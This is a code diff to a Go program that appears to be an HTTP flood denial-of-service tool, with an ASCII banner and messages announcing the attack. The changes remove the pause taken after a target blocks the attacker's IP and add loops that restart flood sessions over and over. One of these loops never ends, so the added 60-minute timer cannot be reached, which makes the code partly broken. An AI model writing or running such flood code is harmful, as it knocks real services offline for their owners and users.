@@ -127,7 +127,8 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
-func flood() {
+func flood(wg *sync.WaitGroup) {
+	defer wg.Done()
 	addr := host + ":" + port
 	header := ""
 	if mode == "get" {
@@ -197,10 +198,9 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!! \nTaking some time off...") //When showing this message, it means ur ip got blocked or the target server down.
-			time.Sleep(15 * time.Second)
+			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
 			
-		}  else if true {
+		}  else {
 			fmt.Println("Commencing the attack now...")
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -218,6 +218,8 @@ func flood() {
 }
 
 func main() {
+	duration := 60
+ 	timer := time.After(time.Duration(duration) * time.Minute)
 	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
 	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
 	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
@@ -267,13 +269,44 @@ func main() {
 		key = "&"
 	}
 
-	for i := 0; i < threads; i++ {
-		time.Sleep(time.Microsecond * 100)
-		go flood() // Start threads
-		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
-		os.Stdout.Sync()
-		//time.Sleep( time.Millisecond * 1)
+	
+
+	for {
+		var wg sync.WaitGroup
+		wg.Add(threads)
+
+		for i := 0; i < threads; i++ {
+			time.Sleep(time.Microsecond * 100)
+			go flood(&wg) // Start threads
+			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+			os.Stdout.Sync()
+			//time.Sleep( time.Millisecond * 1)
+		}
+
+		wg.Wait()
+		
 	}
+
+	for {
+		select {
+		case <-timer:
+		 return
+		default:
+		 var wg sync.WaitGroup
+		 wg.Add(threads)
+		 fmt.Println("Commencing new session")
+		 for i := 0; i < threads; i++ {
+			time.Sleep(time.Microsecond * 100)
+			go flood(&wg) // Start threads
+			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+			os.Stdout.Sync()
+		 }
+		 wg.Wait()
+		 fmt.Println("Session over")
+		}
+	}
+	
+
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
